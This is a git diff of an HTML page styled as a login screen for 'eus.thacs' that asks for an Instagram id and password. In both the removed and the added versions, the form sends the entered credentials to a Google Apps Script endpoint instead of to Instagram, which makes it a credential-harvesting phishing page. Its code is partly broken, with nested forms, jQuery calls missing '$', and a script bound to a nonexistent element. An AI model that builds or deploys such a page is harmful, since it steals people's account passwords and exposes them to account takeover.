@@ -1,102 +1,87 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #fff;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            max-width: 400px;
-            background: #333;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            display: inline-block;
-            border: none;
-            border-radius: 6px;
-            box-sizing: border-box;
-            background-color: #555;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-        }
-        input[type="submit"] {
-            width: 100%;
-            background-color: #4CAF50;
-            color: white;
-            padding: 14px 20px;
-            margin: 20px 0 10px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-        input[type="submit"]:hover {
-            background-color: #45a049;
-        }
-        label {
-            font-size: 18px;
-            margin-bottom: 5px;
-        }
-        h2 {
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 28px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>eus.thacs Login</title>
+<style>
+  body {
+    background-color: #121212;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    background-color: rgba(255, 255, 255, 0.05);
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+    text-align: center;
+  }
+
+  input[type="text"], input[type="password"] {
+    width: calc(100% - 40px);
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    background-color: rgba(255, 255, 255, 0.1);
+    color: #fff;
+    border-radius: 25px;
+    outline: none;
+  }
+
+  input[type="submit"] {
+    width: calc(100% - 40px);
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    background-color: #4CAF50;
+    color: #fff;
+    border-radius: 25px;
+    cursor: pointer;
+    outline: none;
+    transition: background-color 0.3s;
+  }
+
+  input[type="submit"]:hover {
+    background-color: #45a049;
+  }
+
+  .error {
+    color: #ff3333;
+    margin-top: 10px;
+  }
+
+  h2 {
+    margin-bottom: 20px;
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <h2>Login to eus.thacs</h2>
-                
-                <form id="#submit-form" action="">
-        <form action="https://nishanahdassociates.github.io/eus.thacs/" method="get">
-            <label for="username">Instagram id</label>
-            <input type="text" id="username" name="username" placeholder="Enter your instagram id" required>
-        
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Enter your password" required>
-        
-            <input type="submit" value="Login">
-        </form>
-    </div>
-    <script>
-        ("#submit-form").submit((e)=>{
-            e.preventDefault()
-            .ajax({
-                url:"https://script.google.com/macros/s/AKfycbz24zvKGYdaz2m4OTtBLqHo3ZpXRLZjfoKFC4o5azC0IVMfF4P1I41Q9vP081avoSV5/exec",
-                data:("#submit-form").serialize(),
-                method:"post",
-                success:function (response){
-                    alert("Form submitted successfully")
-                    window.location.reload()
-                    //window.location.href="https://nishanahdassociates.github.io/eus.thacs/"
-                },
-                error:function (err){
-                    alert("Something Error")
-    
-                }
-            })
-        })
-    </script>
+
+<div class="container">
+  <h2>Login</h2>
+  <form action="https://script.google.com/macros/s/AKfycbyOvJqxnWUNNieYRUrOu29F2VoGYDWMW5bMBRR7NiBkYgRgVDdjVJBXPVGLqOgbL_w/exec" method="POST">
+    <input type="text" name="username" placeholder="Instagram id">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" value="Login">
+    <submit action="https://nishanahdassociates.github.io/eus.thacs/">
+  </form>
+  <div class="error" id="error"></div>
+</div>
+
+<script>
+  document.getElementById("loginForm").addEventListener("submit", function(event) {
+    var username = document.querySelector('input[name="username"]').value;
+    var password = document.querySelector('input[name="password"]').value;
+  }
+</script>
+
 </body>
 </html>
